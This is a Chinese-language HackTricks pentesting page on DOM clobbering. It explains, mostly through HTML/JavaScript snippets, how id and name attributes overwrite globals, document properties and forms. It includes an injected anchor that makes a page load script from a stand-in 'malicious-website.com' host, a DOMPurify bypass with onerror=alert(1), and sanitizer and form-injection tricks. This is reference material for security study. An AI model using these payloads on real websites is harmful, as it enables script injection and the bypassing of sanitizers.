# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **基础知识**

可以通过在HTML标签中使用**`id`**和**`name`**属性来生成**JS上下文中的全局变量**。
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
只有特定的元素可以使用`name`属性来覆盖全局变量，它们是：`embed`、`form`、`iframe`、`image`、`img`和`object`。

有趣的是，当你使用`form`元素来覆盖一个变量时，你将得到元素本身的`toString`值：`[object HTMLFormElement]`，但是使用`anchor`时，`toString`将是锚点的`href`。因此，如果你使用`a`标签来覆盖，你可以在它被视为字符串时控制它的值：
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### 数组和属性

还可以**覆盖数组**和**对象属性**：
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
要覆盖第三个属性（例如x.y.z），您需要使用一个`form`：
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
覆盖更多属性**更加复杂但仍然可行**，使用iframes：
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
使用style标签可以给iframe足够的时间来渲染。如果没有它，你会看到一个未定义的警告。
{% endhint %}

要深层覆盖属性，可以使用带有HTML编码的iframe，如下所示：
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **绕过过滤器**

如果一个过滤器正在使用类似 `document.getElementByID('x').attributes` 的方式循环遍历节点的属性，你可以**覆盖**属性**`.attributes`**并**破坏过滤器**。其他可被**覆盖**的 DOM 属性包括**`tagName`**、**`nodeName`**、**`parentNode`**等。
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **覆盖 `window.someObject`**

JavaScript开发人员常用的一种模式是：
```javascript
var someObject = window.someObject || {};
```
如果您可以控制页面上的一些HTML，您可以使用DOM节点（例如锚点）覆盖`someObject`引用。考虑以下代码：
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
为了利用这个有漏洞的代码，你可以注入以下HTML代码来覆盖`someObject`引用，使用一个锚点元素：

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

注入的数据 **`window.someObject.url`** 将变为 `href=//malicious-website.com/malicious.js`

**技巧**：**`DOMPurify`** 允许您使用 **`cid:`** 协议，该协议**不会对双引号进行 URL 编码**。这意味着您可以**注入一个编码的双引号，在运行时解码**。因此，注入类似于 **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** 的内容将使 HTML 编码的 `&quot;` 在运行时**解码并从属性值中转义**，从而创建 **`onerror`** 事件。

另一种常见的技术是使用 **`form`** 元素。一些客户端库将遍历创建的表单元素的属性进行清理。但是，如果您在表单内创建一个具有 `id=attributes` 的 `input`，您将**覆盖属性属性**，而清理器将**无法遍历真实属性**。

您可以在[**此 CTF writeup 中找到此类覆盖的示例**](iframes-in-xss-and-csp.md#iframes-in-sop-2)。

## 覆盖 document 对象

根据文档，可以使用 DOM 覆盖来覆盖 document 对象的属性：

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) 接口[支持命名属性](https://webidl.spec.whatwg.org/#dfn-support-named-properties)。[Document](https://html.spec.whatwg.org/multipage/dom.html#document) 对象的[支持的属性名称](https://webidl.spec.whatwg.org/#dfn-supported-property-names)在任何时刻都包括以下内容，按照贡献它们的元素的[树顺序](https://dom.spec.whatwg.org/#concept-tree-order)排列，忽略后续的重复项，并且在相同元素同时贡献 id 属性和 name 属性时，使用来自 id 属性的值优先于来自 name 属性的值：
>
> \- 所有具有非空 name 内容属性并且在文档树中与文档作为其[根](https://dom.spec.whatwg.org/#concept-tree-root)的[公开](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)、[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)、[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)、[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) 和[公开](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) 元素的 name 内容属性的值；\
> \
> \- 所有具有非空 [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) 内容属性并且在文档树中与文档作为其[根](https://dom.spec.whatwg.org/#concept-tree-root)的[公开](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) 元素的 id 内容属性的值；\
> \
> \- 所有具有同时具有非空 [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) 内容属性和非空 name 内容属性的[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) 元素的 id 内容属性的值，并且在文档树中与文档作为其[根](https://dom.spec.whatwg.org/#concept-tree-root)。

使用此技术，您可以覆盖常用的**值，如 `document.cookie`、`document.body`、`document.children`**，甚至可以覆盖 Document 接口中的方法，如 `document.querySelector`。
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2) [img, form, cookie: img]

typeof(document.cookie)
'object
```
## 在元素被覆盖后写入

如果您注入具有相同id属性的`<html>`或`<body>`标签，您可以覆盖**`document.getElementById()`**和**`document.querySelector()`**调用的结果。以下是一个示例：
```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```
还有一个有趣的地方是，你可以从`innerText`中**隐藏元素**，因此如果你注入一个HTML/body标签，你可以使用样式将其从`innerText`中隐藏起来，以防止其他文本干扰你的攻击：
```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```
我们也研究了SVG，可以在其中使用`<body>`标签：
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
你需要一个`<foreignobject>`标签才能在Chrome和Firefox上使用SVG内部的HTML标签：
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
## 覆盖表单

通过在某些标签中指定`form`属性，可以在表单中添加新条目。您可以使用此功能在表单中添加新值，甚至可以添加一个新的按钮来发送它（点击劫持或滥用一些`.click()`的JS代码）：

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* 有关更多[**按钮的属性，请查看此处**](https://www.w3schools.com/tags/tag\_button.asp)**。**

## 参考资料

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
